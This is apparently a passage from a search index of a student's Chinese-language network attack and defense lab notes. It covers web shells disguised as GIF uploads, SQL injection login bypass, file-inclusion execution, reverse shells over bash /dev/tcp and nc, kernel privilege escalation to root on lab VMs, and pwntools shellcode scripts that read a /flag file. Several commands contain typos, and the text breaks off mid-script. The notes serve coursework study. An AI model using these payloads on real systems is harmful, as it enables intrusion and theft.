http://10.0.2.8:80/head (CODE:200|SIZE:2793)                                                                                                            \n==&gt; DIRECTORY: http://10.0.2.8:80/images/                                                                                                                 \n+ http://10.0.2.8:80/in (CODE:200|SIZE:47524)                                                                                                             \n+ http://10.0.2.8:80/index (CODE:200|SIZE:3267)                                                                                                           \n+ http://10.0.2.8:80/index.php (CODE:200|SIZE:3267)                                                                                                       \n+ http://10.0.2.8:80/panel (CODE:302|SIZE:2469)                                                                                                           \n+ http://10.0.2.8:80/server-status (CODE:403|SIZE:289)                                                                                                    \n+ http://10.0.2.8:80/show (CODE:200|SIZE:1)                                                                                                               \n+ http://10.0.2.8:80/test (CODE:200|SIZE:72)                                                                                                              \n\n---- Entering directory: http://10.0.2.8:80/images/ ----\n(!) WARNING: Directory IS LISTABLE. No need to scan it.                        \n    (Use mode '-w' if you want to scan it anyway)\n\n-----------------\nEND_TIME: Mon Nov 10 06:24:20 2025\nDOWNLOADED: 4612 - FOUND: 11\n</code></pre> <p>\u6211\u4eec\u5c1d\u8bd5\u626b\u63cf\u5230\u7684\u8bf8\u591a\u6587\u4ef6\uff0c\u5bf9\u4e8e <code>test</code> \u6587\u4ef6\uff1a</p> <p></p> <p>\u53d1\u73b0\u5176\u9700\u8981 <code>file</code> \u53c2\u6570\uff0c\u8fd9\u662f\u4e00\u4e2a\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e.</p> <p>\u4f7f\u7528 Burp Suite \u8fdb\u884c\u62e6\u622a\uff1a</p> <p>Proxy/Open browser, Proxy/intercept off -&gt; Proxy/intercept  on, \u5728 browser \u4e2d\u8f93\u5165 URL <code>http:10.0.2.8:80/test</code>, Proxy/Request/Change request method, Proxy/Request/Send to Repeater</p> <p></p> <p>\u5728\u6700\u540e\u4e00\u884c\u8f93\u5165 <code>file=index.php</code> \u4ee5\u4e0b\u8f7d\u5f97\u5230\u6e90\u7801\uff0c\u53f3\u8fb9 Response \u9009\u62e9 Raw\uff1a\u5176\u4e2d\u91cd\u8981\u7684\u51e0\u884c\u5982\u4e0b\uff1a</p> <pre><code>$uname=str_replace('\\'','',urldecode($_POST['un']));\n$pass=str_replace('\\'','',urldecode($_POST['ps']));\n$run='select * from auth where  pass=\\''.$pass.'\\' and uname=\\''.$uname.'\\'';\n$result = mysqli_query($conn, $run);\n</code></pre> <p>\u6839\u636e SQL \u8bed\u6cd5\uff0c\u5f97\u5230\u4e00\u4e2a\u53ef\u884c\u7684\u6ce8\u5165\u4ee3\u7801\uff1a</p> <pre><code>or 1=1 #\" / =\\\n</code></pre> <p>\u5c06\u5176\u4f5c\u4e3a\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u6210\u529f\u767b\u5165.</p> <p>\u8fdb\u5165\u9875\u9762\u4e4b\u540e\uff0c\u6211\u4eec\u53d1\u73b0\u5de6\u8fb9\u53ef\u4ee5\u9009\u62e9 <code>Show Users</code> \u6216\u8005 <code>Add User</code>\uff0c\u5bf9\u4e8e\u540e\u8005\uff0c\u7f51\u9875\u5141\u8bb8\u4e0a\u4f20\u56fe\u7247\uff0c\u6211\u4eec\u5c1d\u8bd5\u4e0a\u4f20\u4e00\u4e2a\u4f2a\u88c5\u6210\u56fe\u7247\u7684\u6728\u9a6c.</p> <p>\u6211\u4eec\u4ecd\u7136\u901a\u8fc7\u4e4b\u524d\u7c7b\u4f3c\u4e8e\u67e5\u770b <code>index.php</code> \u7684\u65b9\u5f0f\u67e5\u770b <code>panel.php</code> \u4ee5\u67e5\u8be2\u56fe\u7247\u4e0a\u4f20\u68c0\u6d4b\u7684\u6e90\u7801\uff1a\u5176\u4e2d\u91cd\u8981\u7684\u51e0\u884c\u5982\u4e0b\uff1a</p> <pre><code>    if(in_array($r,$image))\n    {\n        $finfo = @new finfo(FILEINFO_MIME); \n    $filetype = @$finfo-&gt;file($_FILES['image']['tmp_name']);\n        if(preg_match('/image\\/jpeg/',$filetype )  || preg_match('/image\\/png/',$filetype ) || preg_match('/image\\/gif/',$filetype ))\n                {\n                    if (move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name']))\n                             {\n                              echo \"Uploaded successfully \";\n                              $update='insert into users(name,address,image,id) values(\\''.$name.'\\',\\''.$address.'\\',\\''.$iname.'\\', \\''.$id.'\\')'; \n                             mysqli_query($conn, $update);\n\n                            }\n                }\n            else\n            {\n                echo \"&lt;br&gt;i told you dear, only png,jpg and gif file are allowed\";\n            }\n    }\n    else\n    {\n        echo \"&lt;br&gt;only png,jpg and gif file are allowed\";\n\n    }\n</code></pre> <p>\u53d1\u73b0\u9996\u5148\u68c0\u6d4b <code>$filetyle</code> \u662f\u5426\u662f <code>jpeg</code>\u3001<code>png</code>\u3001<code>gif</code> \u5176\u4e2d\u4e4b\u4e00\uff0c\u5176\u6b21\u68c0\u6d4b\u6587\u4ef6\u5934\uff0c\u4e8e\u662f\u6211\u4eec\u4f7f\u7528\u4e00\u53e5\u8bdd\u6728\u9a6c\uff1a</p> <pre><code>GIF87a\n&lt;?php @eval($_POST['shell']);?&gt;\n</code></pre> <p>\u540c\u65f6\u4fee\u6539\u6728\u9a6c\u7684\u6587\u4ef6\u540e\u7f00\u540d\u4e3a <code>.gif</code> \u5e76\u4e0a\u4f20.</p> <p>\u901a\u8fc7 <code>Show Users</code> \u4e2d\u56fe\u7247\uff0c\u53f3\u51fb\u9009\u4e2d\u5e76 <code>Copy Image Link</code> \u5f97\u5230\u56fe\u7247\u6240\u5728\u6587\u4ef6\u5939\u8def\u5f84\u4e3a\uff1a<code>http://10.0.2.8/uploaded_images/</code>.</p> <p>\u7136\u540e\u6211\u4eec\u67e5\u770b <code>panel.php</code> \u4e2d\u56fe\u7247\u52a0\u8f7d\u90e8\u5206\u7684\u4ee3\u7801\uff1a</p> <pre><code>if(isset($_POST['continue']))\n{\n    $dir=getcwd();\n    $choice=str_replace('./','',$_POST['load']);\n\n    if($choice==='add')\n    {\n            include($dir.'/'.$choice.'.php');\n            die();\n    }\n\n        if($choice==='show')\n    {\n\n        include($dir.'/'.$choice.'.php');\n        die();\n    }\n    else\n    {\n        include($dir.'/'.$_POST['load']);\n    }\n\n}\n</code></pre> <p>\u56e0\u6b64\u53ea\u9700\u5c06 <code>load</code> \u53c2\u6570\u6309\u683c\u5f0f <code>load=uploaded_images/trojan.gif</code> \u8bbe\u7f6e\u5373\u53ef\uff0c\u5176\u4e2d <code>trojan.gif</code> \u662f\u6728\u9a6c\u6587\u4ef6\u540d.</p> <p>\u56de\u5230\u4e0a\u4f20\u754c\u9762\uff0cBurp Suite \u5f00\u542f\u62e6\u622a\u540e\u70b9\u51fb\u4e0a\u4f20\uff0c\u62e6\u622a\u4e0b\u6765\u540e\u8f6c\u5230 Repeater\uff0c\u5e76\u4fee\u6539\uff1a</p> <pre><code>POST /panel.php?cmd=whoami HTTP/1.1\nHost: 10.0.2.8\nContent-Length: 49\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://10.0.2.8\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://10.0.2.8/panel.php\nAccept-Encoding: gzip, deflate, br\nCookie: PHPSESSID=lv8rchvgsnejeps9bc6cckvc82\nConnection: keep-alive\n\nload=uploaded_images/torjan.gif&amp;continue=continue\n</code></pre> <p></p> <p>\u5f97\u5230\u4e86\u7528\u6237\u540d\uff01\u7136\u540e\u4fee\u6539\u4e0a\u9762\u7684 <code>whoami</code> \uff0c\u53cd\u5f39 Shell \u4e00\u4e0b\uff1a</p> <pre><code>nc -lvvp 3343\n</code></pre> <pre><code>POST /panel.php?cmd=bash+-c+\"bash+-i+&gt;%26+/dev/tcp/10.0.2.4/3343+0&gt;%261\" HTTP/1.1\n</code></pre> <p>\u5f97\u5230\u4e86\uff1a</p> <pre><code>\u2514\u2500$ nc -lvvp 3343\nlistening on [any] 1234 ...\n10.0.2.5: inverse host lookup failed: Unknown host\nconnect to [10.0.2.4] from (UNKNOWN) [10.0.2.8] 45714\nbash: no job control in this shell\nwww-data@indishell:/var/www$\n</code></pre> <p>\u4f7f\u7528 <code>lsb_release -a</code> \u5f97\u5230\u7248\u672c\u4e3a Ubuntu 12.04.5 LTS\uff0c\u5185\u6838\u4e3a Linux 3.13.0\uff0c\u4f7f\u7528 searchsploit \u641c\u7d22\u6f0f\u6d1e\uff0c\u6211\u4eec\u4f7f\u7528</p> <pre><code>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.1 | linux/local/37292.c\n</code></pre> <p>\u8fd9\u4e00\u6761\u8fdb\u884c\u63d0\u6743\uff1a</p> <pre><code>www-data@indishell:/tmp$ ./exploit\n./exploit\nspawning threads\nmount #1\nmount #2\nchild threads done\n/etc/ld.so.preload created\ncreating shared library\nsh: 0: can't access tty; job control turned off\n# whoami\nroot\n</code></pre> <p>\u968f\u5373\u4f7f\u7528 <code>passwd</code> \u4fee\u6539\u5bc6\u7801\uff0c\u5e76\u5728\u9776\u673a\u4e0a\u767b\u9646\uff1a</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab6/","title":"Lab6","text":"<p>Network Atk&amp;Def lab6 241840273 \u6768\u826f\u707c</p> <p>\u67e5\u8be2\u653b\u51fb\u673a IP</p> <pre><code>\u2514\u2500$ sudo ifconfig\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n        inet6 fe80::9d17:dec1:4341:a804  prefixlen 64  scopeid 0x20&lt;link&gt;\n        inet6 fd17:625c:f037:2:ea4c:bd7f:25d:cb7e  prefixlen 64  scopeid 0x0&lt;global&gt;\n        ether 08:00:27:3c:97:80  txqueuelen 1000  (Ethernet)\n        RX packets 12  bytes 4810 (4.6 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 29  bytes 4353 (4.2 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 8  bytes 480 (480.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 8  bytes 480 (480.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n</code></pre> <p>\u4e3b\u673a\u53d1\u73b0\uff1a\u5f97\u5230\u9776\u673a ip <code>10.0.2.9</code>.</p> <pre><code>\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 08:00:27:3c:97:80, IPv4: 10.0.2.15\nWARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied\nWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n10.0.2.1        52:54:00:12:35:00       (Unknown: locally administered)\n10.0.2.2        52:54:00:12:35:00       (Unknown: locally administered)\n10.0.2.3        08:00:27:55:ff:dc       (Unknown)\n10.0.2.9        08:00:27:e5:cd:43       (Unknown)\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.061 seconds (124.21 hosts/sec). 4 responded\n</code></pre> <p>\u7aef\u53e3\u626b\u63cf</p> <pre><code>\u2514\u2500$ nmap 10.0.2.9                                                                                                                                          \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 06:00 EST\nNmap scan report for 10.0.2.9\nHost is up (0.00073s latency).\nNot shown: 997 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8000/tcp open  http-alt\nMAC Address: 08:00:27:E5:CD:43 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.20 seconds\n</code></pre> <p>\u53ef\u4ee5\u8bbf\u95ee\u5176 http \u670d\u52a1\uff1a\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95ee <code>80</code> \u7aef\u53e3\uff1a<code>10.0.2.9:80</code>\uff1a</p> <p></p> <p>\u968f\u4fbf Sign up \u4e00\u4e2a\u8d26\u53f7\u540e Login</p> <pre><code>First Name: John\nLast Name: Smith\nNickname:\nPassword: 123456\nConfirm Password: 123456\nEmail: test@abc.com\nBirth Date: 1/January/1996\nGender: Male\nHometown:\nAdditional Informatioin\n</code></pre> <p></p> <p>\u53d1\u73b0\u5176\u53ef\u4ee5\u968f\u4fbf\u53d1 post\uff1a</p> <p></p> <p>\u6ce8\u610f\u5230 Profile \u9875\u9762\u6709 Upload Image \u6709\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u8003\u8651\u4f7f\u7528\u4e00\u53e5\u8bdd\u6728\u9a6c + AntSword \u83b7\u53d6 Shell\uff1a</p> <p></p> <p>\u4e00\u53e5\u8bdd\u6728\u9a6c\uff08torjan_251117.php5\uff09</p> <pre><code>&lt;?php eval($_POST['cmd']); ?&gt;\n</code></pre> <p>\u8fd9\u4e2a\u6587\u4ef6\u4e0a\u4f20\u751a\u81f3\u6ca1\u6709\u68c0\u67e5\u6587\u4ef6\u5934\u548c\u540e\u7f00\u540d.</p> <p>\u5f97\u5230\u5176\u6587\u4ef6\u5730\u5740\uff1a</p> <pre><code>http://10.0.2.9/data/images/posts/11.php5\n</code></pre> <p>\u7136\u540e\u4f7f\u7528 AntSword \u8fdb\u884c\u8fde\u63a5\uff1a</p> <p></p> <p>\u7136\u540e\u53f3\u51fb\uff0c\u8fdb\u5165\u865a\u62df\u7ec8\u7aef\uff1a</p> <pre><code>(*) \u57fa\u7840\u4fe1\u606f\n\u5f53\u524d\u8def\u5f84\uff1a/var/www/html/data/images/profiles\n\u78c1\u76d8\u5217\u8868\uff1a/\n\u7cfb\u7edf\u4fe1\u606f\uff1aLinux socnet2 4.15.0-38-generic #41-Ubuntu SMP Wed Oct UTC 2018 x86-64\n\u5f53\u524d\u7528\u6237\uff1awww-data\n(*) \u8f93\u5165 ashelp \u67e5\u770b\u672c\u5730\u547d\u4ee4\n(www-data:/var/www/html/data/images/profiles) $\n</code></pre> <p>\u67e5\u8be2\u5185\u6838\u7248\u672c\uff1a</p> <pre><code>(www-data:/var/www/html/data/images/profiles) $ lsb release -a\nNo LSB Modules are available\nDistributor ID:    Ubuntu\nDescription:    Ubuntu 18.04.1 LTS\nRelease:    18.04\nCodename:    bionic\n(www-data:/var/www/html/data/images/profiles) $\n</code></pre> <p>\u4f7f\u7528\u5185\u6838\u6f0f\u6d1e\uff0c\u5c06 <code>linux/local/47163.c</code> \u4e0a\u4f20\u81f3\u9776\u673a\u7684 <code>/tmp</code> \u76ee\u5f55\uff0c\u7136\u800c\u6211\u4eec\u83b7\u53d6\u7684 shell \u529f\u80fd\u5e76\u4e0d\u5168\u9762\uff0c\u53cd\u5f39 shell \u4e00\u4e0b\u83b7\u53d6\u66f4\u5b8c\u5168\u7684 shell:</p> <pre><code>(www-data:/var/www/html/data/images/profiles) $ rm /tmp/f;mkfile /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.15 3343 &gt; /tmp/f\n</code></pre> <p>\u5728\u6b64\u4e4b\u524d\u9700\u76d1\u542c\u6211\u4eec\u6b64\u5904\u6307\u5b9a\u7684 <code>3343</code> \u7aef\u53e3\uff0c\u7136\u540e\u76f4\u63a5\u6267\u884c\uff1a</p> <pre><code>\u2514\u2500$ nc -nvlp 3343\nlistening on [any] 3343 ...\nconnect to [10.0.2.15] from (UNKNOWN) [10.0.2.9] 42918\nbash: cannot set terminal process group (1000): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@socnet2:/var/www/html/data/images/profiles$ python -c \"import ptr;ptr.spawn('/bin/bash')\"\n&lt;iles$ python -c \"import ptr;ptr.spawn('/bin/bash')\"\nwww-data@socnet2:/var/www/html/data/images/profiles$ ls\nls\n1.png 2.png 3.png 11.php5 exp\nwww-data@socnet2:/var/www/html/data/images/profiles$ chmod +x exp\nchmod +x exp\nwww-data@socnet2:/var/www/html/data/images/profiles$ chmod ./exp\n./exp\nbash-4.4# id\nid\nuid=0(root) gid=0(root) groups=0(root), 33(www-data)\nbash-4.4# whoami\nwhoami\nroot\n</code></pre> <p>\u5373\u6210\u529f\u63d0\u6743\u4e3a\u6839\u6743\u9650.</p> <p>\u53e6\u5916\u8fd9\u5176\u5b9e\u5229\u7528\u4e86\u4e00\u4e2a\u9776\u673a\u53d1\u5e03\u524d\u672a\u9884\u6599\u5230\u7684\u6f0f\u6d1e\uff0c\u5b9e\u9645\u4e0a\u9884\u60f3\u7684\u601d\u8def\u5e94\u8be5\u662f\uff1a</p> <p>\u641c\u7d22\u6846\u5c1d\u8bd5 sql \u6ce8\u5165\uff0c\u53d1\u73b0\u53ef\u884c.</p> <p></p> <p>\u4e8e\u662f\u4f7f\u7528 sqlmap \u6ce8\u5165\u5c1d\u8bd5\u83b7\u53d6\u7528\u6237\u8868\u7684\u4fe1\u606f\uff0c\u5f97\u5230\u5bc6\u7801\uff0c\u6000\u7591\u662f MD5 \u52a0\u5bc6\uff0c\u66b4\u529b\u89e3\u7801 <code>21232f297a57a5a743894a0e4a801fc3</code> \u5f97\u5230\u5bc6\u7801\uff1a</p> <pre><code>user_email: admin@localhost.com \npassword: admin\u3001\n</code></pre> <p>\u901a\u8fc7\u4e4b\u524d\u4e0a\u4f20\u4e86 <code>monitor.py</code> \u7684\u63d0\u793a\uff1a</p> <p></p> <p>\u67e5\u770b\u4e4b\u5f97\u5230\u4e00\u4e2a XML-RPC \u670d\u52a1\uff0c\u670d\u52a1\u7aef\u53e3\u4e3a 8000.</p> <p>\u7136\u540e\u8c03\u7528 CPU \u6307\u4ee4\u53cd\u5f39 Shell \u4e4b\u540e\u5229\u7528 suid \u6587\u4ef6\u9006\u5411\u4e00\u4e0b\u63d0\u6743\uff0c\u4f46\u662f\u6211\u6ca1\u641e\u51fa\u6765.</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab7_pwn/","title":"NAD lab07 PWN","text":"<p>20251124 241840273 \u6768\u826f\u707c</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab7_pwn/#score-screenshot","title":"Score Screenshot","text":""},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab7_pwn/#flags","title":"Flags","text":"<p>exp1, 2, 3, 4 flags \u5206\u522b\u5982\u4e0b\uff1a</p> <pre><code>flag{forbidden}\nflag{forbidden}\nflag{forbidden}\nflag{forbidden}\n</code></pre> <p>screenshot \u5206\u522b\u5982\u4e0b\uff1a</p> <p>4 pictures forbidden</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab7_pwn/#detailed-thoughs-exploit-scripts","title":"Detailed Thoughs &amp; Exploit Scripts","text":"<p>\u4ee5\u4e0b\u6bcf\u4e00\u5206\u680f\u76ee\u9996\u5148\u7ed9\u51fa <code>.py</code> \u811a\u672c\u7684\u4ee3\u7801\uff0c\u5b9e\u9645\u6267\u884c\u65f6\u9700\u5c06 <code>p = remote(\"localhost\", &lt;PORT&gt;)</code> \u4e2d\u7684 <code>localhost</code> \u6539\u4e3a\u670d\u52a1\u5668 IP <code>210.28.132.84</code>\uff0c\u5b8c\u6574\u811a\u672c\u4e4b\u540e\u5219\u662f\u5bf9\u811a\u672c\u5206\u90e8\u5206\u7684\u5206\u6790\u3002</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab7_pwn/#exp1","title":"exp1","text":"<pre><code>from pwn import *\ncontext.arch = 'amd64'\n# p = process(\"./chall1\")\np = remote(\"localhost\", 9001) # \u5047\u8bbe\u9898\u76ee\u90e8\u7f72\u5728\u72ec\u7acb\u7aef\u53e3\nshellcode = asm(\n    shellcraft.open('/flag') + # __TODO__\n    shellcraft.read('rax','rsp',128) + # __TODO__\n    shellcraft.write(1,'rsp','rax') # __TODO__\n)\np.recvuntil(b\"bytes):\\n\")\np.send(shellcode)\np.recvline()\nflag = p.recvall(timeout=1)\nprint(b\"Flag: \" + flag.strip())\n</code></pre> <p>Line 1 \u5bfc\u5165 pwn \u5e93\u4ee5\u4f7f\u7528\u76f8\u5173\u5de5\u5177\u548c\u51fd\u6570</p> <p>Line 2 \u6307\u660e pwntools/asm \u6a21\u5757\u76ee\u6807\u67b6\u6784\u662f AMD64\uff08x86-64\uff09\uff0c\u663e\u7136\u4e0d\u540c\u7684\u67b6\u6784\u4f1a\u5f71\u54cd\u4e00\u4e9b\u62bd\u8c61\u7684\u7ea6\u5b9a\u3002</p> <p>Line 3 \u662f\u88ab\u6ce8\u91ca\u6389\u7684\u8c03\u8bd5\u4ee3\u7801\uff0c\u610f\u4e3a\u5728\u672c\u5730\u542f\u52a8\u540d\u4e3a <code>chall1</code> \u7684\u53ef\u6267\u884c\u6587\u4ef6\u5e76\u4e0e\u4e4b\u4ea4\u4e92.</p> <p>Line 4 \u4f7f\u7528 pwntools \u5efa\u7acb\u5230\u8fdc\u7a0b\u9776\u673a\uff08\u6b64\u5904\u5c55\u793a\u4f4d\u672c\u5730 IP \u7684 9001 \u7aef\u53e3\uff09\u7684 TCP \u8fde\u63a5\uff0c\u8fd4\u56de\u4e00\u4e2a tube/socket \u5c01\u88c5\u5bf9\u8c61 <code>p</code>\uff0c\u4ee5\u4fbf\u4e4b\u540e\u4f7f\u7528\u3002</p> <p>Line 5 \u5f00\u59cb\u6784\u9020\u4e00\u4e2a shellcode\uff08\u673a\u5668\u7801\u5b57\u8282\u4e32\uff09\uff0c<code>asm()</code> \u51fd\u6570\u5c06\u4f20\u5165\u7684\u6c47\u7f16/shellcraft \u5b57\u7b26\u6309\u6307\u5b9a\u62bd\u8c61\u7ea6\u5b9a\u7f16\u8bd1\u4e3a\u4e8c\u8fdb\u5236\u673a\u5668\u7801\u3002</p> <p>Line 6 \u4f7f\u7528 pwntools \u7684 <code>shellcraft</code> \u751f\u6210\u6253\u5f00 <code>/flag</code> \u7684\u6c47\u7f16\u7247\u6bb5\uff0c\u6309\u7167\u6307\u5b9a\u62bd\u8c61\u7ea6\u5b9a\uff0c\u5185\u6838\u4f1a\u5c06\u8fd4\u56de\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u653e\u5728 rax \u5bc4\u5b58\u5668\uff08x86-64 \u7684 syscall \u8fd4\u56de\u5bc4\u5b58\u5668\uff09\u4e2d\u3002</p> <p>Line 7 \u4f7f\u7528 pwntools \u7684 <code>shellcraft</code> \u751f\u6210 <code>read(fd, buf, count)</code> \u7684\u6c47\u7f16\uff0c\u5176\u4e2d <code>fd</code> \u6307\u5b9a\u4e3a\u5bc4\u5b58\u5668 rax\uff0c\u7f13\u51b2\u533a <code>buf</code> \u4f7f\u7528\u5f53\u524d\u6808\u9876 rsp \u5bc4\u5b58\u5668\uff0c\u5e76\u4e14\u8bfb\u5165 128 \u4e2a\u5b57\u8282\uff0cread syscall \u5c06\u4f1a\u8fd4\u56de\u8bfb\u5230\u7684\u5b57\u8282\u6570\u5e76\u653e\u7f6e\u5728 rax \u5bc4\u5b58\u5668\u4e2d.</p> <p>Line 8 \u4f7f\u7528 pwntools \u7684 <code>shellcraft</code> \u751f\u6210 <code>write(fd, buf, count)</code> \u7684\u6c47\u7f16\uff0c\u7f13\u51b2\u533a <code>buf</code> \u6307\u5b9a\u4e3a\u521a\u521a\u5b58\u50a8\u5185\u5bb9\u7684 rsp \u5bc4\u5b58\u5668\uff0c<code>count</code> \u4f7f\u7528\u5b58\u5728\u5bc4\u5b58\u5668 rax \u4e2d\u7684\u4e4b\u524d\u8fd4\u56de\u7684\u8bfb\u5230\u7684\u5b57\u8282\u6570\uff0c<code>fd</code> \u6307\u5b9a\u4e3a <code>1</code> \u8868\u793a\u6807\u51c6\u8f93\u51fa\u3002</p> <p>Line 9 \u7ed3\u675f shellcode \u7684\u6784\u5efa\uff0cLine 6-8 \u4e2d\u4f7f\u7528\u4e86\u52a0\u53f7\u62fc\u63a5\u4e09\u6761\u547d\u4ee4\uff0c\u5e76\u5728\u8fd9\u91cc\u58f0\u660e\u7ed3\u675f\u751f\u6210\u603b\u7684\u4e00\u7cfb\u5217\u673a\u5668\u7801\u3002</p> <p>Line 10 <code>p.recvuntil(b\"bytes:\\n\")</code> \u7406\u89e3\u4e3a\u9898\u76ee\u7a0b\u5e8f\u6253\u5370\u7684\u63d0\u793a\uff0c\u6b64\u65f6\u7b49\u5f85\u8fdc\u7aef\u7a0b\u5e8f\u53d1\u9001\u4e00\u4e2a\u4ee5 <code>b\"bytes:\\n\"</code> \u7ed3\u5c3e\u7684\u63d0\u793a\u5b57\u7b26\u4e32\u3002<code>recvuntil</code> \u7684\u610f\u601d\u662f\u963b\u585e\u76f4\u5230\u8bfb\u53d6\u5230\u6539\u5b57\u8282\u5e8f\u5217\u6216\u8d85\u65f6\u3002</p> <p>Line 11 \u5c06\u751f\u6210\u7684 shellcode \u53d1\u9001\u5230\u8fdc\u7aef\u8fdb\u7a0b\uff0c\u6b64\u5904\u6ca1\u6709\u81ea\u52a8\u5728\u672b\u5c3e\u52a0\u6362\u884c\uff0c\u56e0\u672a\u4f7f\u7528 <code>sendline()</code> .</p> <p>Line 12 \u4ece\u8fdc\u7aef\u8bfb\u53d6\u5e76\u4e22\u5f03\u4e00\u884c\uff0c\u4ee5\u63a8\u8fdb\u534f\u8bae\u6216\u6e05\u7406\u6389\u4e00\u8def\u7684 prompt/\u56de\u663e\u4fe1\u606f\u3002</p> <p>Line 13 \u63a5\u53d7\u8fdc\u7aef\u5269\u4e0b\u7684\u6240\u6709\u6570\u636e\u76f4\u5230\u8fdc\u7aef\u5173\u95ed\u8fde\u63a5\u6216\u8d85\u65f6\uff08timeout=1\u3010\u79d2\u3011\uff09\uff0c\u4e3a\u4e86\u7b49\u5230\u8fdc\u7aef\u628a flag \u5f04\u5230 stdout \u5e76\u65ad\u5f00\u6216\u9759\u9ed8\u3002\u8fd4\u56de\u503c\u662f\u63a5\u6536\u5230\u7684\u5b57\u8282\uff0c\u8d4b\u503c\u7ed9 <code>flag</code> .</p> <p>Line 14 \u5c06 <code>flag</code> \u6e05\u9664\u9996\u5c3e\u7a7a\u767d\uff08<code>strip()</code>\uff09\u540e\u62fc\u63a5\u6307\u5b9a\u524d\u7f00\uff08\u5373\u6309\u6307\u5b9a\u683c\u5f0f\uff09\u6253\u5370\u3002</p> <p>\u4ee5\u4e0a shellcode \u7684\u6267\u884c\u6d41\u662f <code>open('/flag')</code> \u2192 <code>rax=fd</code> \u2192 <code>read('rax', 'rsp', 128)</code> \u2192 <code>rax=bytes_read</code> \u2192 <code>write(1, 'rsp', 'rax')</code> \u4ece\u800c\u5c06 <code>/flag</code> \u5185\u7684\u5185\u5bb9\u8f93\u51fa\u5230 stdout.</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab7_pwn/#exp2","title":"exp2","text":"<pre><code>from pwn import *\ncontext.arch = 'amd64'\n# p = process(\"./chall2\")\np = remote(\"localhost\", 9002) # \u5047\u8bbe\u9898\u76ee\u90e8\u7f72\u5728\u72ec\u7acb\u7aef\u53e3\nshellcode = asm(\n    shellcraft.openat(-100,'/flag',0) + # __TODO__\n    shellcraft.read('rax','rsp',128) + # __TODO__\n    shellcraft.write(1,'rsp','rax') # __TODO__\n)\np.recvuntil(b\"bytes):\\n\")\np.send(shellcode)\np.recvline()\nflag = p.recvall(timeout=1)\nprint(b\"Flag: \" + flag.strip())\n</code></pre> <p>\u76f8\u6bd4\u4e8e exp1\uff0c\u6b64\u5904\u4ec5\u6539\u52a8\u4e86 \u76f8\u5173\u7aef\u53e3\u548c Line 6\uff0c\u4e0b\u9762\u89e3\u91ca Line 6</p> <p>Line 6 \u7684\u683c\u5f0f\u662f <code>openat(AT_FECWD, \"/flag\", O_RDONLY)</code> \uff0c\u5176\u4e2d <code>AT_FDCWD</code> \u7684\u503c\u5728 Linux \u4e0a\u7b49\u4e8e <code>-100</code>. \u8fd9\u6761\u6307\u4ee4\u5c31\u4f1a\u7b49\u4ef7\u4e8e <code>open(\"/flag\", O_RDONLY)</code>\uff0c<code>O_RDONLY</code> \u5728 Linux \u4e2d\u4e3a 0\uff0c\u8868\u793a\u6253\u5f00\u65b9\u5f0f\u4e3a\u6309\u53ea\u8bfb\u6a21\u5f0f\u6253\u5f00\uff08\u663e\u7136 RDONLY \u5c31\u662f ReaD ONLY \u7684\u610f\u601d\uff09\uff0c\u4e0e\u4e4b\u6709\u7c7b\u4f3c\u4f5c\u7528\u7684\u662f\u6309\u53ea\u5199\u6a21\u5f0f\u6253\u5f00\u7684 O_WRONLY\uff08\u5728 Linux \u4e0b\u4e3a 1\uff09\u548c\u6309\u53ef\u8bfb\u53ef\u5199\u6a21\u5f0f\u6253\u5f00\u7684 O_RDWR\uff08\u5728 Linux 2\uff09. \u56e0 <code>shellcraft.openat</code> \u7684\u51fd\u6570\u8981\u6c42 flags \u53c2\u6570\uff08\u6b64\u5904\u7684 O_RDONLY \u4f4d\u7f6e\uff09\uff0c\u6545\u800c\u6211\u4eec\u9700\u8981\u5199\u8fd9\u4e00\u4e2a <code>0</code>.</p>"},{"location":"in_class_learning/semester_3/network_attack_and_defense/lab7_pwn/#exp3","title":"exp3","text":"<pre><code>from pwn import 